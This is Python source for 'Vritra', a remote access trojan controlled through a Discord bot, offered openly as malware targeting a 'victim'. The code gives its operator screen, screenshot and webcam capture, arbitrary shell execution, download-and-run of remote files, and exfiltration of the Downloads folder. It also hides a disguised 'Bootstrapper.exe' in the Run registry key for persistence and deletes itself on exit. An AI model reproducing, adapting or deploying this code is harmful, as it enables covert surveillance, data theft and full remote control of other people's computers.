import os
import cv2
import discord
import asyncio
import ctypes
import psutil
import requests
import datetime
import platform
import numpy as np
import subprocess
import webbrowser
import pyautogui
import socket
import pygame
import winreg
import sys
import shutil
from PIL import ImageGrab
from discord.ext import commands

intents = discord.Intents.all()
bot = commands.Bot(command_prefix='.', intents=intents, help_command=None)

config = {
    'token': "%%token%%",
    'server_id': '%%id%%'
}

sessions = {}


@bot.event
async def errorerror(ctx, error):
    if isinstance(error, commands.CommandNotFound):
        await ctx.send("Command doesn't exist :skull:")


@bot.event
async def on_ready():
    print(f'Logged in as {bot.user.name}')
    await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name="Vritra the Danava"))

    server = bot.get_guild(int(config['server_id']))
    if server:
        category = discord.utils.get(server.categories, name='Sessions')
        if not category:
            category = await server.create_category_channel('Sessions')

        pcn = socket.gethostname().lower()

        session = discord.utils.get(category.channels, name=pcn)
        if session:
            sessions[pcn] = session
            print(f"Reconnected to session '{pcn}' in {category.name}'.")
        else:
            session = await category.create_text_channel(pcn)
            sessions[pcn] = session
            print(f"New session '{pcn}' created in {category.name}'.")

        embed = discord.Embed(
            title=":snake: Vritra is now Connected" if session else "Vritra is Reconnected",
            description=f"Your Session Key is '{pcn}'",
            color=discord.Color.green()
        )

        embed.add_field(
            name="Instruction:",
            value="Use .help to get the command list",
            inline=False
        )
        await session.send(embed=embed) if session else None
    else:
        print("Server not found.")


@bot.command()
async def help(ctx):
    embed = discord.Embed(title="Vritra Commands", description="List of available commands:", color=discord.Color.blue())

    remote_desktop_commands = [
        (".screenshot <sessionkey>", "Takes a screenshot of the user's PC"),
        (".record <sessionkey>", "Records the user's screen for 30 seconds"),
        (".webcam <sessionkey>", "Captures a picture from the user's webcam")
    ]
    embed.add_field(name="Remote Desktop", value=format_command_list(remote_desktop_commands), inline=False)

    information_gathering_commands = [
        (".time <sessionkey>", "Retrieves the user's date and time"),
        (".ipinfo <sessionkey>", "Retrieves the user's IP information"),
        (".sysinfo <sessionkey>", "Retrieves the user's system information"),
        (".usage <sessionkey>", "Tells you the users disk and cpu usage")
    ]
    embed.add_field(name="Recon commands1", value=format_command_list(information_gathering_commands),
                    inline=False)

    remote_shell_commands = [
        (".shell <session> <command>", "Executes a command on the victim's computer")
    ]
    embed.add_field(name="Remote Shell Commands", value=format_command_list(remote_shell_commands), inline=False)

    file_management_commands = [
        (".website <sessionkey> <https://example.com>", "Sends the user to a website of choice"),
        (".getdownloads <sessionkey>", "Gets all Users files in downloads folder"),
        (".download <sessionkey>", "Can download any file in their downloads folder")
    ]
    embed.add_field(name="File Management", value=format_command_list(file_management_commands), inline=False)

    system_control_commands = [
        (".restart <sessionkey>", "Restarts the user's computer"),
        (".shutdown <sessionkey>", "Shuts down the user's computer")
    ]
    embed.add_field(name="System Control", value=format_command_list(system_control_commands), inline=False)

    malware_commands = [
        (".upload <session> <filelink>", "Uploads and downloads file and then runs it on victim's PC"),
        (".startup <session>", "Puts RAT on startup"),
        (".terminate", "Terminates the connection and performs cleanup.")
    ]
    embed.add_field(name="Malware Commands", value=format_command_list(malware_commands), inline=False)

    troll_command = [
        (".music <session> <file_attachment>", "Plays music on their computer")
    ]
    embed.add_field(name="Misc Commands", value=format_command_list(troll_command), inline=False)

    await ctx.send(embed=embed)


def format_command_list(commands1):
    return "\n".join([f"`{command}` - {description}" for command, description in commands1])


@bot.command()
async def screenshot(ctx, seshn: str):
    session = sessions.get(seshn)
    if session:
        screenshot1 = pyautogui.screenshot()
        screenshot1.save(f'{seshn}.png')
        await ctx.send(f"Screenshot", file=discord.File(f'{seshn}.png'))
    else:
        pass


@bot.command()
async def time(ctx, seshn: str):
    session = sessions.get(seshn)
    if session:
        ctime = datetime.datetime.now().strftime("%H:%M:%S")
        cdate = datetime.date.today().strftime("%Y-%m-%d")
        await ctx.send(f"The users current time > {ctime}")
        await ctx.send(f"The users current date > {cdate}")
    else:
        pass


@bot.command()
async def ipinfo(ctx, seshn: str):
    session = sessions.get(seshn)
    if session:
        url = "http://ipinfo.io/json"
        response = requests.get(url)
        data = response.json()

        embed = discord.Embed(title="IP INFO", description="IP INFO", color=discord.Color.purple())
        embed.add_field(name=":globe_with_meridians: IP", value=f"```{data['ip']}```", inline=False)
        embed.add_field(name=":house: City", value=f"```{data['city']}```", inline=True)
        embed.add_field(name=":map: Region", value=f"```{data['region']}```", inline=True)
        embed.add_field(name=":earth_americas: Country", value=f"```{data['country']}```", inline=True)
        embed.add_field(name=":briefcase: Organization", value=f"```{data['org']}```", inline=False)

        await ctx.send(embed=embed)
    else:
        pass


@bot.command()
async def sysinfo(ctx, seshn: str):
    session = sessions.get(seshn.lower())
    if session:
        si = platform.uname()

        embed = discord.Embed(title="System Information", color=discord.Color.purple())
        embed.add_field(name="System", value=f"```{si.system}```", inline=False)
        embed.add_field(name="Node Name", value=f"```{si.node}```", inline=True)
        embed.add_field(name="Release", value=f"```{si.release}```", inline=True)
        embed.add_field(name="Version", value=f"```{si.version}```", inline=True)
        embed.add_field(name="Machine", value=f"```{si.machine}```", inline=True)
        embed.add_field(name="Processor", value=f"```{si.processor}```", inline=True)

        await session.send(embed=embed)
    else:
        pass


@bot.command()
async def record(ctx, seshn: str):
    session = sessions.get(seshn.lower())
    if session:
        await ctx.send("Recording started")

        start = datetime.datetime.now()
        duration = datetime.timedelta(seconds=30)
        frames = []

        while datetime.datetime.now() - start < duration:
            img = ImageGrab.grab()
            frames.append(cv2.cvtColor(np.array(img), cv2.COLOR_RGB2BGR))

            await asyncio.sleep(0.1)

        height, width, _ = frames[0].shape
        outputf = "screen.mp4"
        fourcc = cv2.VideoWriter_fourcc(*'mp4v')
        videow = cv2.VideoWriter(outputf, fourcc, 10, (width, height))

        for frame in frames:
            videow.write(frame)
        videow.release()

        await ctx.send("Recording completed")
        await ctx.send(file=discord.File(outputf))
        os.remove(outputf)
    else:
        pass


@bot.command()
async def errorbox(ctx, seshn: str, *, message: str):
    session = sessions.get(seshn.lower())
    if session:
        await ctx.send("Sent Errorbox whoopty Doo!")
        ctypes.windll.user32.MessageBoxW(None, message, "Error", 0)
        await ctx.send("They saw the error message.")
    else:
        pass


@bot.command()
async def website(ctx, seshn: str, websiteu: str):
    session = sessions.get(seshn.lower())
    if session:
        try:
            webbrowser.open(websiteu)

            await ctx.send(f"opened Website")
        except webbrowser.Error:
            await ctx.send("Failed")
    else:
        pass


@bot.command()
async def shutdown(ctx, seshn: str):
    session = sessions.get(seshn.lower())

    if session:
        await ctx.send(f"Shutting down session '{seshn}'...")
        await bot.close()

        script_path = os.path.abspath(sys.argv[0])
        os.remove(script_path)
        sys.exit(0)
    else:
        await ctx.send(f"Session '{seshn}' is not active.")


@bot.command()
async def restart(ctx, seshn: str):
    session = sessions.get(seshn.lower())

    if session:
        try:
            subprocess.call(["shutdown", "/r", "/t", "0"])
            await ctx.send("Computer restarted.")
        except Exception as e:
            await ctx.send(f"Failed to restart computer: {str(e)}")
    else:
        await ctx.send(f"Session '{seshn}' is not active.")


@bot.command()
async def webcam(ctx, seshn: str):
    session = sessions.get(seshn.lower())
    if session:
        cap = cv2.VideoCapture(0)

        if not cap.isOpened():
            await ctx.send("Failed")
            return

        ret, frame = cap.read()

        if not ret:
            await ctx.send("Failed.")
            return
        output = "webcam.jpg"
        cv2.imwrite(output, frame)
        await session.send("", file=discord.File(output))
        os.remove(output)
        cap.release()
    else:
        pass


@bot.command()
async def shell(ctx, seshn: str, *, command: str):
    session = sessions.get(seshn.lower())
    if session:
        try:
            output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, universal_newlines=True)
            with open("output.txt", "w") as file:
                file.write(output)
            await session.send(file=discord.File("output.txt"))
            os.remove("output.txt")
        except subprocess.CalledProcessError as e:
            pass
    else:
        pass


@bot.command()
async def usage(ctx, seshn: str):
    session = sessions.get(seshn.lower())
    if session:
        disku = psutil.disk_usage("/")
        totaldisk = round(disku.total / (1024 ** 3), 2)
        useddisk = round(disku.used / (1024 ** 3), 2)
        diskperc = disku.percent

        cpuperc = psutil.cpu_percent()

        embed = discord.Embed(title="System Usage", color=discord.Color.purple())
        embed.add_field(name="Session", value=seshn, inline=False)
        embed.add_field(name="Disk", value=f"```{useddisk} GB / {totaldisk} GB ({diskperc}%)```", inline=False)
        embed.add_field(name="CPU", value=f"```{cpuperc}%```", inline=False)

        await session.send(embed=embed)
    else:
        pass


@bot.command()
async def upload(ctx, seshn: str, filel: str):
    session = sessions.get(seshn.lower())
    if session:
        if not filel.startswith("https://cdn.discordapp.com/attachments/"):
            await ctx.send("Invalid link. It must be a Discord attachment download link.")
            return

        try:
            response = requests.get(filel)
            if response.status_code == 200:
                filen = filel.split("/")[-1]
                filep = f"./{filen}"
                with open(filep, "wb") as file:
                    file.write(response.content)

                try:
                    subprocess.Popen(["start", filep], shell=True)
                except subprocess.SubprocessError:
                    await ctx.send("Failed to run the file.")
                else:
                    await ctx.send("File has been run.")
            else:
                await ctx.send("Failed to download the file.")
        except requests.exceptions.RequestException:
            await ctx.send("Error occurred during download.")
    else:
        pass


@bot.command()
async def getdownloads(ctx, seshn: str):
    session = sessions.get(seshn.lower())
    if session:
        downloadf = os.path.expanduser("~\\Downloads")
        files = os.listdir(downloadf)
        if not files:
            await session.send("No files found")
            return

        filel = "\n".join(files)
        with open("CdriveDownload.txt", "w", encoding="utf-8") as file:
            file.write(filel)

        await session.send("", file=discord.File("CdriveDownload.txt"))
        os.remove("CdriveDownload.txt")
    else:
        pass


@bot.command()
async def download(ctx, seshn: str, filename: str):
    session = sessions.get(seshn.lower())
    if session:
        download1 = os.path.expanduser("~\\Downloads")
        file = os.path.join(download1, filename)
        if os.path.isfile(file):
            await session.send(f"Downloaded..", file=discord.File(file))
        else:
            pass
    else:
        pass


@bot.command()
async def music(ctx, seshn: str):
    session = sessions.get(seshn.lower())
    if session:
        if len(ctx.message.attachments) == 0:
            await ctx.send("Invalid file. Please send an MP3 file in the message, not a link or anything.")
            return

        attachment = ctx.message.attachments[0]
        if not attachment.filename.endswith('.mp3'):
            await ctx.send("Invalid file extension.")
            return

        download1 = os.path.join(os.getcwd(), attachment.filename)
        await attachment.save(download1)
        pygame.mixer.init()
        try:
            pygame.mixer.music.load(download1)
            await ctx.send("Playing Music...")
            pygame.mixer.music.play()

            playb = asyncio.create_task(con(pygame.mixer.music))

            while not playb.done():
                await bot.process_commands(ctx.message)
        finally:
            pygame.mixer.music.stop()
            pygame.mixer.quit()
            os.remove(download1)

        await ctx.send("Finished playing the music.")
    else:
        pass


async def con(music_player):
    while music_player.get_busy():
        await asyncio.sleep(1)
    music_player.stop()


@bot.command()
async def startup(ctx, seshn):
    session = sessions.get(seshn.lower())
    if session:
        exe = 'Bootstrapper.exe'
        key = 'Software\\Microsoft\\Windows\\CurrentVersion\\Run'
        directory = os.path.join(os.path.expanduser('~'), 'Documents', 'Resources')
        path = os.path.join(directory, exe)
        os.makedirs(directory, exist_ok=True)
        script_path = sys.argv[0]
        shutil.copy(script_path, path)
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key, 0, winreg.KEY_SET_VALUE) as reg_key:
            winreg.SetValueEx(reg_key, 'Windows', 0, winreg.REG_SZ, path)

        await ctx.send(f'Vritra is now added to startup :)')
    else:
        pass


@bot.command()
async def terminate(ctx):
    await ctx.send("Terminating connection...")
    await bot.close()
    script_path = os.path.abspath(sys.argv[0])
    os.remove(script_path)
    await ctx.send("**Connection has been terminated.**")
    sys.exit(0)


bot.run(config['token'])
